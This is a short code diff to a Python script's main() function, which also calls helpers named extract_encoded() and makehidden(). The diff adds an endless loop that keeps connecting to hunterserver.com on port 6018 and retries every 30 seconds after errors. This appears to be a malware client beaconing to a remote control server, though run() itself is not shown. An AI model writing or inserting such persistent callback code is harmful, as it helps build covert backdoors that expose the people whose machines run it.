@@ -80,7 +80,13 @@ def main():
         extract_encoded()
         makehidden()
     else:
-        pass
+        while True:
+            try:
+                run(host="hunterserver.com", port=6018)
+                time.sleep(30)
+            except Exception as e:
+                print(f"Connection error: {e}")
+                time.sleep(30)
 
 
 # if "__main__" == __name__:
